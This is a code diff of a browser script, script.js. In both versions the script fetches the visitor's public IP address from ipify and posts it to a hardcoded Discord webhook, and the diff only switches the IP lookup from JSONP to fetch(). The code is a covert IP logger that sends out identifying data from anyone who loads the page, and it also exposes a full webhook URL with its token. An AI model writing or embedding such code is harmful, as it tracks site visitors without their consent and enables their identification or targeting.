@@ -1,33 +1,28 @@
 // script.js
 
-// Function to send IP to Discord webhook
+// Function to fetch the IP and send it to Discord webhook
 async function sendIPToDiscord() {
   try {
-    // Fetch IP using JSONP
-    const script = document.createElement('script');
-    script.src = 'https://api.ipify.org/?format=jsonp&callback=handleIPResponse';
-    document.body.appendChild(script);
+    // Fetch the user's IP address
+    const response = await fetch('https://api64.ipify.org?format=json');
+    const data = await response.json();
 
-    // Handle the IP response
-    window.handleIPResponse = async (data) => {
-      const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
-      const payload = {
-        content: `IP Info: ${JSON.stringify(data)}`,
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload),
-        });
-        console.log('IP sent to Discord:', data);
-      } catch (error) {
-        console.error('Failed to send IP info:', error);
-      }
+    // Prepare Discord webhook payload
+    const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
+    const payload = {
+      content: `User IP: ${data.ip}`,
     };
+
+    // Send the IP address to the Discord webhook
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    });
+
+    console.log('IP sent to Discord:', data.ip);
   } catch (error) {
     console.error('Failed to send IP info:', error);
   }
